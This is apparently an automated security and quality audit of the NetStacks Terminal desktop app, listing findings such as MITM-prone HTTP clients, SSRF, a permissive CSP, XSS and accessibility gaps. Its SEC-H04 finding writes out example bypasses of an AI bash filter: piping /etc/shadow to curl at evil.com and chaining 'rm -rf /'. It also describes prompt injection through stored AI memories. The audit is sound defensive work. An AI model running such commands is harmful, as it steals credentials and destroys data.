# NetStacks Terminal — Full Project Audit Report

**Date:** 2026-06-25
**Auditor:** Automated comprehensive audit (backend, frontend, security, UX, accessibility, API contracts)
**Scope:** Rust agent (`agent/`), React frontend (`frontend/`), Tauri config, build config

---

## Executive Summary

Comprehensive audit of the NetStacks Terminal project (Tauri v2 desktop app: Rust Axum backend + React/Vite frontend). **~85+ API endpoints** audited across both layers. Findings organized into 8 categories with verified evidence. Items marked DENIED during verification have been excluded.

| Category | Critical | High | Medium | Low |
|---|---|---|---|---|
| Security | 4 | 7 | 12 | 6 |
| API Mismatches | 0 | 0 | 1 | 5 |
| UX Bugs | 0 | 1 | 2 | 3 |
| Accessibility | 0 | 2 | 2 | 1 |
| Code Quality | 0 | 1 | 0 | 2 |
| **Total** | **4** | **11** | **17** | **17** |

---

## 1. SECURITY — CRITICAL

### SEC-C01: Password transmitted in WebSocket query string
- **Location:** `agent/src/ws.rs:35`
- **Finding:** `WsQuery` struct includes `pub password: Option<String>` as a URL query parameter. Query strings are logged by web servers, proxies, browser history, and process listings. The `tower_http=warn` config (`main.rs:441`) suppresses request-URI logging at default level, but any operator raising log verbosity or a proxy in front will capture passwords in plaintext.
- **Impact:** Credential exposure in logs, browser history, and proxy caches.
- **Recommendation:** Remove password from query params. Use the vault-based session lookup path exclusively, or require a separate authenticated POST before the WS upgrade to submit credentials.

### SEC-C02: `danger_accept_invalid_certs(true)` on 13+ HTTP clients
- **Verified in 7 files, 15 call sites:**
  - `agent/src/api.rs:1635` — NetBox test connection
  - `agent/src/api.rs:1858` — NetBox proxy list
  - `agent/src/api.rs:1930` — NetBox proxy count devices
  - `agent/src/api.rs:2074` — NetBox proxy devices
  - `agent/src/api.rs:2293` — NetBox proxy IP addresses
  - `agent/src/ai/providers.rs:432` — AI provider with custom base URL
  - `agent/src/ai/providers.rs:1198` — AI provider
  - `agent/src/ai/providers.rs:1232` — Custom AI endpoints
  - `agent/src/ai/providers.rs:1256` — Custom AI endpoints
  - `agent/src/ai/oauth2.rs:105` — OAuth2 token endpoints
  - `agent/src/main.rs:184` — Orphan agent eviction probe
  - `agent/src/remote_agents.rs:650` — Remote agent health check
  - `agent/src/discovery/integration_lookup.rs:54` — Discovery lookups
- **Correctly conditional (for reference):** `quick_actions.rs:136` and `api_resource_client.rs:56` use `!resource.verify_ssl`
- **Impact:** Complete MITM vulnerability on every affected connection. AI API keys, OAuth2 secrets, and device credentials can be intercepted.
- **Recommendation:** Apply the same conditional pattern (`!resource.verify_ssl`) everywhere. At minimum, AI provider connections (which carry API keys) should enforce certificate validation.

### SEC-C03: SSRF via NetBox/LibreNMS proxy endpoints
- **Location:** `agent/src/api.rs:1630-2338`
- **Finding:** Multiple endpoints accept a user-supplied `url` field in the request body and make HTTP GET requests to that URL with an attached `Authorization: Token` header and `danger_accept_invalid_certs(true)`. An authenticated attacker (or XSS-compromised frontend) can set `url` to `http://169.254.169.254/latest/meta-data/` (cloud metadata), internal services, or `file://` URIs.
- **Impact:** Server-Side Request Forgery — access to cloud instance metadata, internal network services, and potentially local files.
- **Recommendation:** Validate URLs against an allowlist of configured NetBox/LibreNMS source URLs. Reject private IP ranges, link-local addresses, and non-HTTPS schemes.

### SEC-C04: `.env` file contains live production secrets on disk
- **Location:** `.env` (root of project)
- **Finding:** Contains Apple code signing P12 certificate + plaintext password (`APPLE_CERT_PASSWORD`), Azure AD client secret (`AZURE_CLIENT_SECRET`), Apigee OAuth client secret (`APIGEE_CLIENT_SECRET`), and Microsoft code signing thumbprint.
- **Mitigating factor:** `.gitignore:2` excludes `.env` and `git ls-files .env` confirms it is **not tracked** and was **never committed** to git history.
- **Impact:** Any process or user with read access to the repo directory obtains production signing credentials.
- **Recommendation:** Rotate ALL credentials immediately. Move to a secrets manager (Azure Key Vault, 1Password, etc.) or CI/CD secret injection. Create a `.env.example` with placeholder values.

---

## 2. SECURITY — HIGH

### SEC-H01: Overly permissive Content Security Policy
- **Location:** `frontend/src-tauri/tauri.conf.json:38`
- **Finding:**
  ```
  "csp": "default-src * 'unsafe-inline' 'unsafe-eval' data: blob: tauri: ipc:; script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; connect-src * ws: wss: http: https: tauri: ipc:;"
  ```
  - `default-src *` — allows loading resources from **any origin**
  - `'unsafe-inline'` — permits inline scripts (XSS vector)
  - `'unsafe-eval'` — permits `eval()` (code injection vector)
  - `script-src *` — allows loading scripts from any origin
  - `connect-src *` — allows connections to any origin
- **Impact:** XSS and code injection vectors if any content injection occurs.
- **Recommendation:** Restrict `default-src` to `'self'` and explicitly list required origins. Remove `'unsafe-eval'` if possible. Replace `'unsafe-inline'` with nonces or hashes.

### SEC-H02: `withGlobalTauri: true` — global Tauri API injection
- **Location:** `frontend/src-tauri/tauri.conf.json:24`
- **Finding:** Injects `window.__TAURI__` globally, meaning any loaded content (including third-party iframes or XSS-injected scripts) can access the Tauri IPC API.
- **Impact:** Combined with the permissive CSP, this creates a significant attack surface.
- **Recommendation:** Set `withGlobalTauri: false` and use explicit imports from `@tauri-apps/api`.

### SEC-H03: XSS via `innerHTML` with unsanitized terminal output
- **Location:** `frontend/src/components/Terminal.tsx:2894-2901`
- **Finding:**
  ```js
  popup.innerHTML = `
    <div class="ai-overlord-popup-body">${reason}</div>
  `
  ```
  `reason` is derived from terminal output lines (line 2881: `mainLine.slice(colonIdx + 1).trim()`). Terminal output can contain arbitrary attacker-controlled content from remote SSH hosts.
- **Impact:** Direct XSS sink exploitable by any malicious SSH server.
- **Recommendation:** Use `textContent` or DOM creation APIs instead of `innerHTML`.

### SEC-H04: AI bash command filter is bypassable deny-list
- **Location:** `agent/src/api.rs:3582-3743`, filter at `agent/src/tasks/tools/bash_filter.rs`
- **Finding:** Uses `^\s*`-anchored regex deny-list. Pipes/redirects are explicitly allowed (`bash_filter.rs:344-349`). Example bypass: `cat /etc/shadow | curl -d @- https://evil.com` — `cat` isn't blocked, pipes are allowed, `curl` isn't in the default deny list. Command chaining with `;` can bypass `^\s*` anchoring: `echo foo; rm -rf /` would bypass the `rm` check since `rm` isn't at the start.
- **Impact:** Arbitrary command execution if AI is manipulated via prompt injection.
- **Recommendation:** Switch to an allowlist approach, or add command chaining detection (`;`, `&&`, `||`) and pipe-to-network detection.

### SEC-H05: Local file operations use denylist (not allowlist)
- **Location:** `agent/src/api.rs:11072-11178`
- **Finding:** `validate_local_path` blocks hardcoded paths (`/etc/passwd`, `/etc/shadow`, `/System`, `/usr`, `/bin`, `/sbin`, `/proc`, `/dev`, `/sys`, `~/.ssh/`, and the DB file). However, it allows access to **everything else** — including `~/.gnupg/`, `~/.aws/`, `~/.kube/config`, `~/Library/Keychains/`, `~/.netrc`, `~/.pgpass`, `~/.env`, the agent's own TLS private key (`localhost.key`).
- **Impact:** An authenticated attacker (or XSS-compromised frontend) can read/write/delete sensitive user files including cloud credentials, GPG keys, and the agent's own TLS private key.
- **Recommendation:** Switch to an allowlist approach — restrict to a configurable workspace directory. Block all dotfiles/dotdirs by default.

### SEC-H06: No Error Boundary anywhere in component tree
- **Verified:** 0 results for `ErrorBoundary` across entire `frontend/src/`
- **Finding:** The entire 8,310-line `AppContent` component and all its ~325 child components render without any React error boundary.
- **Impact:** A single render error in any component will crash the entire application with a white screen.
- **Recommendation:** Wrap at minimum: each tab content, each sidebar panel, and the AI side panel in error boundaries.

### SEC-H07: Biometric keychain entry lacks ACL protection
- **Location:** `agent/src/biometric.rs:8-20`
- **Finding:** Uses `set_generic_password` (legacy keychain API) without `kSecAttrAccessControl` / `BiometryCurrentSet`. Any process running as the same macOS user can call `security find-generic-password -s com.netstacks.terminal.vault -w` and retrieve the master password without triggering Touch ID. Acknowledged in code comments.
- **Impact:** Local privilege escalation — any co-user-land process can extract the vault master password and decrypt all stored credentials.
- **Recommendation:** For signed production builds, use the Data Protection keychain with `BiometryCurrentSet` ACL.

---

## 3. SECURITY — MEDIUM

| ID | Finding | Location |
|---|---|---|
| SEC-M01 | CORS allows any method (`tower_http::cors::Any`) and any header (`tower_http::cors::Any`) | `agent/src/main.rs:871-872` |
| SEC-M02 | CORS allows any localhost port — a malicious local web app on any port can make authenticated cross-origin requests | `agent/src/main.rs:861-865` |
| SEC-M03 | Auth token printed to stdout — logged to world-readable `/tmp/.netstacks-agent-launch.log` in remote mode | `agent/src/main.rs:400` |
| SEC-M04 | macOS app sandbox fully disabled (`com.apple.security.app-sandbox: false`) | `frontend/src-tauri/entitlements.plist:6-7` |
| SEC-M05 | Tauri capabilities grant broad fs write (`fs:allow-write-file`, `fs:allow-write-text-file`) + shell access (`shell:default`) | `frontend/src-tauri/capabilities/default.json:22-25` |
| SEC-M06 | Remote agent binds to `0.0.0.0` (all interfaces) — exposed to network-level attacks | `agent/src/main.rs:718` |
| SEC-M07 | `NewCredential` and `ProfileCredential` use plain `String` for passwords with `Debug` derive — passwords logged in plaintext on any `{:?}` formatting | `agent/src/models.rs:335-339`, `agent/src/models.rs:904-914` |
| SEC-M08 | AI prompt injection via stored memories — memories injected verbatim into system prompt as `"- [{}] {}"` formatted lines, no sanitization | `agent/src/ai/chat.rs:872-887` |
| SEC-M09 | Script execution does not call `env_clear()` — child processes inherit agent's full environment (potential secret leakage) | `agent/src/scripts.rs:819-828` |
| SEC-M10 | SSH exec pool silently TOFU-accepts unknown host keys (no approval service wired) | `agent/src/ssh/exec_pool.rs:105`, `agent/src/ssh/mod.rs:210-222` |
| SEC-M11 | Auth token from URL query params in browser/test mode — visible in browser history and referrer headers | `frontend/src/main.tsx:136-141` |
| SEC-M12 | `window.open` with `_blank` missing `noopener,noreferrer` — 7 instances, highest risk in MarkdownViewer where href comes from parsed markdown content | `MarkdownViewer.tsx:90`, `Terminal.tsx:2154`, `SharedTerminal.tsx:99`, `App.tsx:5932`, `forceTouchActions.tsx:9`, `DeviceDetailTab.tsx:1728`, `SettingsPanel.tsx:685` |

---

## 4. SECURITY — LOW

| ID | Finding | Location |
|---|---|---|
| SEC-L01 | TLS cert validity is 10 years (`VALIDITY_DAYS: u64 = 365 * 10`) with renewal only in last 30 days | `agent/src/tls.rs:12` |
| SEC-L02 | Legacy SSH algorithms enabled by default (DH_G1_SHA1, DSA, AES_CBC, HMAC_SHA1) — intentional for old network devices, but MITM downgrade risk | `agent/src/ssh/mod.rs:683-728` |
| SEC-L03 | No request body size limits on any endpoint — multi-GB JSON body could exhaust memory | All endpoints |
| SEC-L04 | `OutputCache` has no size/entry count limit — rapid burst of large SSH outputs could consume unbounded memory | `agent/src/api.rs:87-127` |
| SEC-L05 | SQLite WAL files may have wrong permissions until restart (inherit process umask `0o022`) | `agent/src/db/mod.rs:52-68` |
| SEC-L06 | `column_exists` uses `format!` for SQL — all callers use hardcoded literals so not exploitable today, but latent injection vector | `agent/src/db/mod.rs:532` |

---

## 5. API FRONTEND-TO-BACKEND MISMATCHES

| # | Endpoint | Type | Severity | Impact |
|---|---|---|---|---|
| API-01 | `PUT /topologies/:id/share` | **Missing backend route** | **Medium** | `shareTopology()` in `frontend/src/api/topology.ts:411` will 404 — topology sharing feature is broken |
| API-02 | `GET /ai/status` | Missing backend route | Low | `frontend/src/api/ai.ts:521` fails silently with safe default |
| API-03 | `GET /ai/tools/schemas` | Missing backend route (enterprise-only, no mode guard in frontend) | Low | `frontend/src/api/ai.ts:1424` returns 404 in standalone mode |
| API-04 | `POST /ai/tool-exec` | Missing backend route (enterprise-only, no mode guard in frontend) | Low | `frontend/src/api/ai.ts:1434` returns 404 in standalone mode |
| API-05 | `POST /cert/renew` | Missing frontend call (backend route exists at `main.rs:1342`, unused by frontend) | Low | Cert renewal capability exists in backend but is never invoked from UI |
| API-06 | `PUT /topologies/:id/devices/:device_id/type` | Missing frontend call (backend route exists at `main.rs:1220`) | Low | Used by AI tools internally, not exposed in UI |

---

## 6. UX BUGS (Verified)

### UX-01: `BroadcastCommandDialog` shadows `setTimeout` global
- **Severity: HIGH**
- **Location:** `frontend/src/components/BroadcastCommandDialog.tsx:91,104`
- **Finding:**
  ```tsx
  const [timeout, setTimeout] = useState(30);
  // ...
  setTimeout(30);  // line 104 — calls useState setter, NOT window.setTimeout
  ```
  The state variable `setTimeout` shadows the global `window.setTimeout`. Any code in this component that tries to use `setTimeout()` for timing will call the React state setter instead.
- **Impact:** Latent bug trap — adding any timer-based logic to this component will silently fail.

### UX-02: SFTP file transfer progress is fake
- **Severity: MEDIUM**
- **Location:** `frontend/src/components/SftpFileBrowser.tsx:285-295`
- **Finding:**
  ```tsx
  const progressInterval = setInterval(() => {
    const newProgress = Math.min(t.progress + Math.random() * 15, 95);
  ```
  Progress bars for SFTP downloads are simulated with `Math.random()` rather than reflecting actual transfer progress.
- **Impact:** Users see misleading progress indicators that can stall at 95% for large files or jump erratically.

### UX-03: Hot edge shared timer bug
- **Severity: MEDIUM**
- **Location:** `frontend/src/App.tsx:7452-7478`
- **Finding:** Both left and right hot edge zones share a single `hotEdgeTimerRef` (`App.tsx:752`). Scenario: enter left edge (sets timer) → enter right edge (overwrites ref) → leave left edge (clears the right edge's timer). The right edge's pending open is silently cancelled. No cleanup on component unmount.
- **Impact:** Sidebar hot-edge activation unreliable with rapid mouse movement.

### UX-04: Timer stored in `useState` instead of `useRef`
- **Severity: LOW**
- **Location:** `frontend/src/components/SessionPanel.tsx:355`, `frontend/src/components/TopologyPanel.tsx:229`
- **Finding:**
  ```tsx
  const [autoExpandTimeout, setAutoExpandTimeout] = useState<ReturnType<typeof setTimeout> | null>(null);
  ```
  Storing a timer ID in React state causes unnecessary re-renders and is a stale-closure risk.
- **Impact:** Performance degradation and potential stale-closure bugs.

### UX-05: Deprecated `document.execCommand` usage
- **Severity: LOW**
- **Location:** `frontend/src/App.tsx:5971,6002,6026,6037`
- **Finding:** Four uses of deprecated `document.execCommand('delete')`, `document.execCommand('insertText')`, and `document.execCommand('selectAll')` for contenteditable areas.
- **Impact:** `execCommand('insertText')` bypasses React's controlled input model and could introduce subtle state desync issues.

### UX-06: 20+ silent `.catch(() => {})` error swallowers
- **Severity: MEDIUM**
- **Locations:**
  - `frontend/src/components/SettingsTunnels.tsx:69-71` — profiles, jump hosts, sessions loading
  - `frontend/src/components/mop/MopWorkspace.tsx:421-422` — quick actions and scripts
  - `frontend/src/components/config/ConfigPanel.tsx:281` — config stacks
  - `frontend/src/components/DeviceDetailTab.tsx:507` — device detail fetch
  - `frontend/src/hooks/useWorkspace.ts:424,426,455,457` — workspace state persistence
  - `frontend/src/components/workspace/WorkspaceNewDialog.tsx:56`
  - `frontend/src/components/workspace/WorkspaceFileExplorer.tsx:106`
  - `frontend/src/components/WorkspaceSettingsTab.tsx:84`
  - `frontend/src/components/QuickActionDialog.tsx:258`
  - `frontend/src/components/config/TemplateDetailTab.tsx:102`
- **Impact:** Users get empty lists or stale data with no error indication.

---

## 7. ACCESSIBILITY (Verified)

### A11Y-01: Vast majority of interactive elements lack ARIA attributes
- **Severity: HIGH**
- **Finding:** Only 33 instances of `aria-*` or `role=` attributes found across ~325 components. Most are in a handful of well-built components (`ConfirmDialog`, `UpdateChecker`, `ViewToggle`, `PasswordInput`). The following major UI areas have **zero** accessibility attributes:
  - Terminal component (`Terminal.tsx`, 3,725 lines) — no `role`, no `aria-label`, no `aria-live` for output
  - SessionPanel (`SessionPanel.tsx`, 2,071 lines) — session list has no `role="listbox"`, items have no `role="option"`
  - AISidePanel (`AISidePanel.tsx`, 1,812 lines) — chat messages have no `aria-live="polite"`, no `role="log"`
  - CommandPalette — no `role="combobox"`, no `aria-expanded`
  - All sidebar panels (DocsPanel, TopologyPanel, ChangesPanel, AgentsPanel, etc.) — no `role="navigation"`, no `aria-label`
  - Tab bar — no `role="tablist"`, tabs have no `role="tab"`, no `aria-selected`

### A11Y-02: Modal dialogs missing `aria-modal` and focus trapping
- **Severity: HIGH**
- **Finding:** Only 4 dialogs use `role="alertdialog"` + `aria-modal="true"`:
  - `ConfirmDialog.tsx:137-138`
  - `HostKeyPromptModal.tsx:168`
  - `CommandWarningDialog.tsx:42`
  - `TaskApprovalModal.tsx:114`
- **Affected dialogs (no `aria-modal`, no `role="dialog"`, no focus trap):**
  - `ProfileEditorDialog.tsx` (912 lines)
  - `QuickConnectDialog.tsx` (372 lines)
  - `SessionSettingsDialog.tsx` (1,151 lines)
  - `DiscoveryModal.tsx` (355 lines)
  - `BroadcastCommandDialog.tsx` (382 lines)
  - `NetBoxImportDialog.tsx`
  - `TracerouteDialog.tsx`
  - All `config/*` dialogs

### A11Y-03: Activity bar buttons lack `aria-label`
- **Severity: MEDIUM**
- **Location:** `frontend/src/App.tsx:6807-6855`
- **Finding:** Activity bar toggle buttons use `<button>` elements with `title` attributes, but lack `aria-label` (title is not reliably announced by screen readers), `aria-current` or equivalent to convey active state. Active state communicated only via CSS class `.active`.

### A11Y-04: SVG icons without `aria-hidden`
- **Severity: MEDIUM**
- **Location:** `frontend/src/App.tsx:337-428` and many components
- **Finding:** The `Icons` object defines ~15 SVG icons, none with `aria-hidden="true"`. Screen readers will attempt to announce these SVGs.

### A11Y-05: No skip navigation link
- **Severity: LOW**
- **Finding:** The app has no "Skip to main content" link, requiring keyboard users to tab through the entire activity bar and sidebar before reaching the main content area.

---

## 8. CODE QUALITY

### CQ-01: God component — `App.tsx` is 8,310 lines
- **Severity: HIGH**
- **Location:** `frontend/src/App.tsx`
- **Finding:** `AppContent()` is a single function component with:
  - 37 `useState` calls
  - 29 `useEffect` hooks
  - ~80 `useCallback` handlers
  - All tab management, sidebar state, AI panel state, topology state, discovery state, troubleshooting state, split pane state, drag-and-drop state, context menu state, and more
- **Impact:** Extremely difficult to test, maintain, or reason about. State updates in one area can cause unexpected re-renders in unrelated areas. Root cause of many other issues in this audit.

### CQ-02: IIFEs in JSX props
- **Severity: LOW**
- **Location:** `frontend/src/App.tsx:7391-7411`
- **Finding:**
  ```tsx
  focusedSessionId={(() => { ... })()}
  focusedSessionName={(() => { ... })()}
  scriptContext={(() => { ... })()}
  ```
  Immediately-invoked function expressions inside JSX props create new values on every render, defeating memoization.
- **Recommendation:** Extract into `useMemo` hooks or helper functions.

### CQ-03: Inconsistent error reporting patterns
- **Severity: LOW**
- **Finding:** Three different error reporting patterns used across the codebase:
  1. `showToast(error, 'error')` — user-visible toast
  2. `console.error(err)` — silent console logging
  3. `.catch(() => {})` — completely silent
- **Impact:** No centralized error reporting or logging strategy. Users get inconsistent error experiences.

---

## 9. Positive Security Observations (Verified)

| Area | Evidence |
|---|---|
| Constant-time token comparison | `agent/src/api.rs:202`, `agent/src/ws.rs:96` |
| Vault brute-force rate limiting with exponential backoff | `agent/src/providers/local.rs:1258-1274` |
| AI script approval gate (EXEC-014) — AI-authored scripts require explicit user approval | `agent/src/scripts.rs:946-955` |
| Read-only command filter for AI SSH execution (EXEC-001) | `agent/src/api.rs:3387-3403` |
| Config mode server-side gating with master password, 5-min TTL (EXEC-002) | `agent/src/api.rs:10846-10874` |
| File write uses base64 encoding (NOT heredocs — heredoc injection finding was **DENIED**) | `agent/src/tasks/tools/write_helpers.rs:177-194` |
| Terminal `env_clear()` prevents credential leakage to PTY children (EXEC-011) | `agent/src/terminal.rs:94` |
| Data sanitization layer for credential redaction before AI provider calls | `agent/src/ai/sanitizer.rs` |
| SSH key encryption at rest with master password | `agent/src/cert_manager.rs:121` |
| Binary SHA-256 verification for remote agent binaries (supply chain protection) | `agent/src/remote_agents.rs:570-604` |
| Auth token stripped from env after init | `agent/src/main.rs:411` |
| `.env` properly excluded from git | `.gitignore:2`, confirmed via `git ls-files` |
| `enrichPopup.ts` uses safe DOM APIs (`createElement` + `textContent`), NOT innerHTML for content — **innerHTML XSS finding DENIED** | `frontend/src/lib/enrichPopup.ts:559-563` |
| `SettingsHighlighting.tsx` `dangerouslySetInnerHTML` properly escaped via `escapeHtml()` — **XSS finding DENIED** | `frontend/src/components/SettingsHighlighting.tsx:707-713` |
| Session opening and bulk connect race conditions — **DENIED** (uses functional `setTabs(prev => ...)` state updates) | `frontend/src/App.tsx:2200-2260`, `frontend/src/App.tsx:4630-4686` |
| CORS origin validation properly scoped to localhost + Tauri origins with port validation | `agent/src/main.rs:833-868` |
| Keyboard-interactive echo protection prevents password echo on malicious servers (REMOTE-017) | `agent/src/ssh/mod.rs:335-338` |
| uv binary SHA-256 verification (EXEC-012) — supply chain protection for Python runtime | `agent/src/scripts.rs:46-53,142-164` |
| Log path confinement prevents arbitrary file write via log endpoints (DATA-002) | `agent/src/api.rs:1126-1167` |
| Database file permissions `0o600` on SQLite files (DATA-006) | `agent/src/db/mod.rs:48-68` |
| Email rate limiting prevents spam via AI agent (EXEC-016) | `agent/src/tasks/tools/send_email.rs:16-39` |
| Atomic cache writes (temp file + rename) prevents corrupted cached binaries | `agent/src/remote_agents.rs:607-625` |

---

## 10. Top 10 Priority Fixes

| Priority | ID | Fix |
|---|---|---|
| 1 | SEC-C04 | **Rotate all `.env` secrets immediately** — Apple cert password, Azure client secret, Apigee credentials are plaintext on disk |
| 2 | SEC-H03 | **Fix XSS in `Terminal.tsx:2894`** — Use `textContent` or DOM creation APIs instead of `innerHTML` with terminal output |
| 3 | SEC-C02 | **Make `danger_accept_invalid_certs` conditional** on user-configured `verify_ssl` for all 13 call sites (follow the pattern in `quick_actions.rs:136`) |
| 4 | SEC-H01/H02 | **Tighten CSP** (remove `*` wildcards, `'unsafe-eval'`, `'unsafe-inline'`) and **set `withGlobalTauri: false`** |
| 5 | SEC-H06 | **Add React Error Boundaries** around tab content, sidebar panels, and AI panel |
| 6 | SEC-H04 | **Switch bash filter to allowlist** or add command chaining detection (`;`, `&&`, `||`) and pipe-to-network detection |
| 7 | API-01 | **Add backend route for `PUT /topologies/:id/share`** — topology sharing feature is currently broken (404) |
| 8 | UX-01 | **Rename `setTimeout` state variable** in `BroadcastCommandDialog.tsx:91` to avoid shadowing the global `window.setTimeout` |
| 9 | A11Y-01/02 | **Add ARIA attributes** to tab bar, sidebar, terminal, and all modal dialogs |
| 10 | CQ-01 | **Refactor `App.tsx`** — extract state into custom hooks and sub-components to reduce the 8,310-line god component |

---

## Appendix: Audit Methodology

1. **Backend audit:** Read all Rust source files in `agent/src/`, focusing on `api.rs` (12,759 lines), `main.rs`, `ws.rs`, `tls.rs`, `crypto.rs`, `models.rs`, `ssh/`, `ai/`, `tasks/`, `db/`, `biometric.rs`, `scripts.rs`
2. **Frontend audit:** Read all API client modules in `frontend/src/api/` (20 files), key UI components, `App.tsx`, and accessibility patterns
3. **API contract verification:** Cross-referenced all ~85+ frontend API endpoint paths against backend route registrations in `main.rs` router setup
4. **Security configuration audit:** Read `.env`, `.gitignore`, `tauri.conf.json`, `entitlements.plist`, `capabilities/default.json`, `vite.config.ts`, `SECURITY.md`
5. **Verification pass:** Each finding was verified by reading the actual source code. Findings that could not be confirmed were marked DENIED and excluded from the final report.
6. **Total files examined:** ~150+ source files across both backend and frontend
